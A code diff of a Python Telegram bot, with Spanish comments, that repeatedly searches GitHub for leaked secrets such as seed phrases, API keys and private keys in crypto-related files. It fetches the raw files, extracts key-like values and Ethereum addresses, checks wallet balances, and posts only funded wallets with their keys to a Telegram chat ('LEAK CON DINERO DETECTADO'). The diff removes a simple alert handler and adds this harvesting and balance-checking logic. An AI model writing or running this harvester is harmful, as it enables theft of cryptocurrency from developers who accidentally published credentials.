@@ -2,7 +2,6 @@ import os
 import re
 import requests
 import asyncio
-from telegram import Update
 from telegram.ext import ApplicationBuilder, MessageHandler, filters, ContextTypes
 
 # ===== VARIABLES =====
@@ -21,9 +20,7 @@ SEARCH_TERMS = [
     "seed phrase",
     "api_key",
     "SECRET_KEY",
-    "wallet =",
-    "PRIVATE_KEY =",
-    "mnemonic ="
+    "PRIVATE_KEY ="
 ]
 
 SEEN_URLS = set()
@@ -91,28 +88,14 @@ def detect_and_validate(text):
 
     return findings
 
-# ===== TELEGRAM HANDLER =====
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    msg = update.message
+# ===== EXTRAER =====
+def extract_values(text):
+    return list(set(re.findall(VALUE_REGEX, text)))[:5]
 
-    if not msg or not msg.text:
-        return
+def extract_wallets(text):
+    return list(set(re.findall(ETH_REGEX, text)))[:3]
 
-    findings = detect_and_validate(msg.text)
-
-    if findings:
-        response = "🚨 ALERTA 🚨\n\n"
-        response += msg.text + "\n\n"
-
-        for f in findings:
-            response += f"- {f}\n"
-
-        await context.bot.send_message(
-            chat_id=CHAT_ID,
-            text=response
-        )
-
-# ===== GITHUB SEARCH =====
+# ===== GITHUB =====
 def search_github():
     headers = {
         "Authorization": f"token {GITHUB_TOKEN}"
@@ -121,12 +104,12 @@ def search_github():
     results = []
 
     for term in SEARCH_TERMS:
-        url = f"https://api.github.com/search/code?q={term}+in:file+extension:py+extension:js&sort=indexed&order=desc"
+        url = f"https://api.github.com/search/code?q={term}+crypto+in:file+extension:py+extension:js&sort=indexed&order=desc"
 
         try:
             r = requests.get(url, headers=headers).json()
 
-            for item in r.get("items", [])[:3]:
+            for item in r.get("items", [])[:5]:
                 file_url = item["html_url"]
 
                 if file_url in SEEN_URLS:
@@ -134,35 +117,63 @@ def search_github():
 
                 SEEN_URLS.add(file_url)
 
-                results.append(f"🔍 {term}:\n{file_url}")
+                raw_url = file_url.replace("github.com", "raw.githubusercontent.com").replace("/blob/", "/")
+
+                try:
+                    content = requests.get(raw_url, timeout=5).text[:4000]
+                except:
+                    continue
+
+                if term.lower() not in content.lower():
+                    continue
+
+                values = extract_values(content)
+                wallets = extract_wallets(content)
+
+                # 🔥 verificar balances
+                rich_wallets = []
+
+                for w in wallets:
+                    bal = get_eth_balance(w)
+                    if bal > 0:
+                        rich_wallets.append((w, bal))
+
+                # 🚨 SOLO SI HAY DINERO
+                if not rich_wallets:
+                    continue
+
+                msg = f"💸 LEAK CON DINERO DETECTADO 💸\n\n{file_url}\n\n"
+
+                for w, b in rich_wallets:
+                    msg += f"🟣 ETH: {w}\n💰 {b:.4f} ETH\n\n"
+
+                for v in values:
+                    msg += f"🔑 {v}\n"
+
+                results.append(msg)
 
         except:
             continue
 
     return results
 
-# ===== GITHUB MONITOR =====
+# ===== MONITOR =====
 async def github_monitor(context: ContextTypes.DEFAULT_TYPE):
     results = search_github()
 
     for r in results:
-        await context.bot.send_message(
-            chat_id=CHAT_ID,
-            text=f"🚨 GITHUB ALERT 🚨\n\n{r}"
-        )
+        await context.bot.send_message(chat_id=CHAT_ID, text=r)
 
 # ===== MAIN =====
 app = ApplicationBuilder().token(TELEGRAM_TOKEN).build()
 
-# limpiar conflictos
+# limpiar webhook
 asyncio.get_event_loop().run_until_complete(
     app.bot.delete_webhook(drop_pending_updates=True)
 )
 
-app.add_handler(MessageHandler(filters.ALL, handle_message))
-
-# loop github cada 60s
+# loop cada 60s
 app.job_queue.run_repeating(github_monitor, interval=60, first=10)
 
-print("🤖 BOT PRO ACTIVO (Telegram + GitHub + Wallets)")
+print("🤖 BOT ELITE ACTIVO (LEAK + DINERO)")
 app.run_polling()
